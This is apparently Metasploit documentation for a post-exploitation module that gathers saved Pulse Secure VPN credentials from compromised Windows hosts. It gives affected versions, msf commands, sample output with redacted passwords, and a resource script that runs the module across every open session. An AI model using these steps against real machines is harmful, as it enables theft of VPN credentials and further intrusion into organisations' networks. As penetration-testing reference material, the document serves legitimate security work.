## Vulnerable Application

Pulse Secure VPN Client for versions 9.1 prior to 9.1R4 and 9.0 prior to 9.0R5.

An end-to-end setup with working Juniper Pulse Secure VPN server, Pulse Secure client on
Microsoft Windows, and valid credentials are required for Pulse Secure client to save
credentials locally and therefore test this.

## Verification Steps

1. Get a Meterpreter shell on a Windows machine that has Pulse Secure client installed.
2. Load the module: `use post/windows/gather/credentials/pulse_secure`
3. Set the correct session on the module: `set SESSION *session id*`
4. Run the module with `run` and enjoy the loot.

## Scenarios

### Normal mode
```
msf > use post/windows/gather/credentials/pulse_secure
msf > set SESSION 1
msf > run
```

Output:

```
[*] Checking for Pulse Secure IVE profiles in the registry
[+] Account Found:
[*]      Username:
[*]      Password: REDACTED
[*]      URI: https://connect.contoso.com/pulse
[*]      Name: Home Working VPN (EU)
[*]      Source: user
[+] Account Found:
[*]      Username:
[*]      Password: REDACTED
[*]      URI: https://connect.contoso.com/pulse
[*]      Name: Home Working VPN (US)
[*]      Source: user
[*] Post module execution completed
```

### Run on all sessions
If you wish to run the post against all sessions from framework, here is how:

1. Create the following resource script:
```
framework.sessions.each_pair do |sid, session|
  run_single("use post/windows/gather/credentials/pulse_secure")
  run_single("set SESSION #{sid}")
  run_single("run")
end
```
2. At the msf prompt, execute the above resource script:
`msf > resource path-to-resource-script`

## References

- https://qkaiser.github.io/reversing/2020/10/27/pule-secure-credentials
- https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601
